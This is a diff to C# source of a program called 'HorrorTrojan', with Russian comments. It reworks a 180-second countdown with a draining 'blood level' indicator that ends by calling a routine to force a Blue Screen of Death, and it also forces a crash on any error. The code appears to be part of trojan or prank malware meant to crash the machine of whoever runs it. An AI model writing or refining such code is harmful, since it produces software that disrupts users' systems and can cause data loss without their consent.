@@ -212,21 +212,9 @@ namespace HorrorTrojan
             try
             {
                 TimeSpan elapsed = DateTime.Now - startTime;
-                double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
                 
-                if (double.IsNaN(percent) || double.IsInfinity(percent))
-                    percent = 0;
-                
-                if (percent < 0) percent = 0;
-                if (percent > 100) percent = 100;
-                
-                int newBloodLevel = 100 - (int)Math.Round(percent);
-                if (newBloodLevel < 0) newBloodLevel = 0;
-                if (newBloodLevel > 100) newBloodLevel = 100;
-                
-                bloodLevel = newBloodLevel;
-                
-                if (elapsed.TotalSeconds >= maxSeconds || bloodLevel <= 0)
+                // ===== ТОЛЬКО ОДНО УСЛОВИЕ: ПРОШЛО 180 СЕКУНД =====
+                if (elapsed.TotalSeconds >= maxSeconds)
                 {
                     if (!timerCompleted)
                     {
@@ -244,10 +232,27 @@ namespace HorrorTrojan
                             BSODTrigger.TriggerBSOD();
                         }
                     }
+                    return;
                 }
+                
+                // ===== ПЛАВНОЕ УМЕНЬШЕНИЕ ИНДИКАТОРА =====
+                double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
+                
+                if (double.IsNaN(percent) || double.IsInfinity(percent))
+                    percent = 0;
+                
+                if (percent < 0) percent = 0;
+                if (percent > 100) percent = 100;
+                
+                int newBloodLevel = 100 - (int)Math.Round(percent);
+                if (newBloodLevel < 0) newBloodLevel = 0;
+                if (newBloodLevel > 100) newBloodLevel = 100;
+                
+                bloodLevel = newBloodLevel;
             }
             catch
             {
+                // ===== ТОЛЬКО ПРИ ОШИБКЕ ВЫЗЫВАЕМ BSOD =====
                 if (!bsodTriggered)
                 {
                     bsodTriggered = true;
